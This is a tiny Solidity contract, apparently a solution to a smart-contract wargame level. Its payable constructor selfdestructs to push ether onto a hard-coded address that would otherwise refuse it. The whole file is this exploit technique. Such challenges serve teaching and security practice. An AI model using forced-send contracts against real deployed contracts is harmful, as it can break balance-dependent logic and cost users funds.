// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Contract to send ether to:
// 0xf17fAA913Ef4A56fEbd652580cF32B8D66Cb723C

contract Force {
    constructor() payable {
        selfdestruct(payable(0xf17fAA913Ef4A56fEbd652580cF32B8D66Cb723C));
    }
}
